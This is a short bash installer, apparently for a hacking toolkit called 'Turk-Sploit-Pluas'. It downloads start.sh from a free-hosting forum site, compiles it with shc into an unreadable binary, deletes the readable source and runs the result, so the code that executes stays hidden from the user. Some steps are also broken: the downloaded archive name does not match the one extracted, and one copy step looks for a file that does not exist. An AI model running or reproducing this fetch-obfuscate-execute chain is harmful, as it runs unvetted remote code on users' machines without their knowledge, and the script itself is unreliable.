#!/bin/bash
apt install shc -y
cd $HOME
wget http://www.datsi.fi.upm.es/~frosal/sources/shc-3.8.9.tg
tar -xvf shc-3.8.9.tgz
cd shc-3.8.9/
make
curl -O https://turksibertimi-forum.000webhostapp.com/start.sh
shc -f start.sh
rm -rf $HOME/Turk-Sploit-Pluas/start.sh
cd $HOME/shc-3.8.9/ && cp start.sh.x  $HOME/Turk-Sploit-Pluas/
rm -rf $HOME/shc-3.8.9.tgz
rm -rf $HOME/shc-3.8.9/
cd $HOME &&
cp start.sh.x  $HOME/Turk-Sploit-Pluas/
cd $HOME &&
rm -rf start.sh start.sh.x start.sh.x.c
cd $HOME/Turk-Sploit-Pluas/ && ls && ./start.sh.x
